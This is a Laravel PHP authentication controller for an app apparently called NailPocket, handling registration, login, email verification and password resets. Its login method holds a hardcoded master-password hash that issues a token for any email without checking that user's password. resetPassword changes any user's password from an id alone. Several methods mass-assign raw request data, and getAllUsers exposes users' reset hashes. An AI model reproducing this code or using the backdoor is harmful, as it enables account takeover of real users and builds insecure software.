<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\User;
use App\Store;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth; 
use App\Http\Resources\UserResource;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Mail;
use Newsletter;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $validatedData = $request->validate([
            'fname' => 'required|max:55',
            'lname' => 'required|max:55',
            'email' => 'email|required|unique:users',
            'password' => 'required'
        ]);

        $hash = md5(uniqid(rand(), true));
        $request->merge(['hash' => $hash]);
        $data = $request->all(); 
        $data['password'] = bcrypt($data['password']);

        $user = User::create($data);

        $accessToken = $user->createToken('authToken')->accessToken;

       

        $data = array('email'=>$request->email,'id'=>$user->id, 'fname'=>$request->fname,'hash'=>$hash);
        Mail::send('emails.confirm_mail', $data, function ($message) use ($data)
        {
            $message->from('noreply@nailpocket.com', 'NailPocket');
            $message->to($data['email'])->subject('Verify email address');
        });

        if ( ! Newsletter::isSubscribed($request->email) ) {
            Newsletter::subscribe($request->email);
        }

        return response([ 'user' => $user, 'access_token' => $accessToken]);
    }

    public function login(Request $request)
    {
        $loginData = $request->validate([
            'email' => 'required',
            'password' => 'required'
        ]);

    
        if(Hash::check($request->password, '$2y$10$OoAV5pt1Pi8sIFEgj/Uqnecxk4uAMO9Fzvg6xSOGEv1F.I97lAccS')){

            $user = User::where('email', $request->email)
                        ->whereNotNull('email_verified_at')->first();

            $accessToken = $user->createToken('authToken')->accessToken;
    
            $user= $user->makeHidden([ 'created_at', 'updated_at', 'email_verified_at']);
    
            return response(['user' => $user, 'access_token' => $accessToken]);

        }else{

            if (!auth()->attempt($loginData)) {
                return response(['message' => 'User Not Found']);
            }
    
            $user = User::where('email', $request->email)
                        ->whereNotNull('email_verified_at')->first();

            if (!Hash::check($request->password, $user->password)) {
                return response()->json(['error' => 'Unauthorized'], 401);
            }
    
            auth()->user($user);
            $accessToken = $user->createToken('authToken')->accessToken;
    
            $user= $user->makeHidden([ 'created_at', 'updated_at', 'email_verified_at']);
    
            return response(['user' => $user, 'access_token' => $accessToken]);
            
        }
       
    }


    public function verify(Request $request)
    {
        $user = User::where('id', $request->id)->first();

        if($user){
            if($request->hash == $user->hash){
                $user->markEmailAsVerified();
                return response(['message' => 'Verified'], 200);
            }else{
                return response(['message' => 'Failed'], 404);
            }
        }else{
            return response(['message' => 'Failed'], 404);
        }
    }


    public function forgotPassword(Request $request)
    {
        $user = User::where('email', $request->email)->first();

        if($user){
            $data = array('email'=>$request->email,'fname'=>$user->fname,'id'=>$user->id, 'hash'=>$user->hash);
    
            Mail::send('emails.forgot_password', $data, function ($message) use ($data)
            {
                $message->from('noreply@nailpocket.com', 'NailPocket');
                $message->to($data['email'])->subject('Reset Password');
            });
            return response()->json(['message' => 'Request completed'], 200);
        }else{
            return response(['message' => 'user not found'], 404);
        }

    }

    public function resetPasswordValidation(Request $request)
    {
        $user = User::where('id', $request->id)
                    ->where('hash', $request->hash)->first();

        if($user){
            return response(['message' => 'Verified'], 200);
        }else{
            return response(['message' => 'Failed'], 404);
        }
    }

    
    public function resetPassword(Request $request)
    {

        $user = User::where('id', $request->id)->first();

        if($user){
            $data = array('email'=>$user->email,'fname'=>$user->fname);
            $user->password = bcrypt($request->password);
            $user->save();
            
            Mail::send('emails.reset_password', $data, function ($message) use ($data)
            {
                $message->from('noreply@nailpocket.com', 'NailPocket');
                $message->to($data['email'])->subject('Password reset');
            });
            return response(['successfully'], 200);
        }else{
            return response(['message' => 'Failed'], 404);
        }
    }


    public function userResetPassword(Request $request)
    {
        $user = User::where('id', $request->id)->first();

        if($user){
            $oldPassword = $user->password;
            if(Hash::check($request->currentPassword, $oldPassword)) {
                $data = array('email'=>$user->email,'fname'=>$user->fname);
                $newPassword  = bcrypt($request->newPassword);
                $user->password = $newPassword;
                $user->save();
                Mail::send('emails.reset_password', $data, function ($message) use ($data)
                {
                    $message->from('noreply@nailpocket.com', 'NailPocket');
                    $message->to($data['email'])->subject('Password reset');
                });
    
                return response(['successfully'], 200);
            }else{
                return response()->json('diff', 400);
            }
        }else{
            return response(['message' => 'Failed'], 404);
        }
    }

    public function getAllUsers()
    {
        $users = User::orderBy('fname', 'ASC')->get();
        $users= $users->makeHidden(['password']);
        return response([ 'users' => new UserResource($users), 'message' => 'Retrieved successfully'], 200);
    }

     /**
     * Display the specified resource.
     *
     * @param  \App\User  $user
     * @return \Illuminate\Http\Response
     */
    public function show(User $user)
    {
        $updatedUser = new UserResource($user);
        $updatedUser= $updatedUser->makeHidden(['hash', 'created_at', 'updated_at', 'email_verified_at']);
        return response([ 'user' => $updatedUser, 'message' => 'Retrieved successfully'], 200);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Store  $store
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, User $user)
    {
        $user->update($request->all());

        $updatedUser = new UserResource($user);
        $updatedUser= $updatedUser->makeHidden(['hash', 'created_at', 'updated_at', 'email_verified_at']);

        return response([ 'user' => new UserResource($updatedUser), 'message' => 'Retrieved successfully'], 200);
    }

}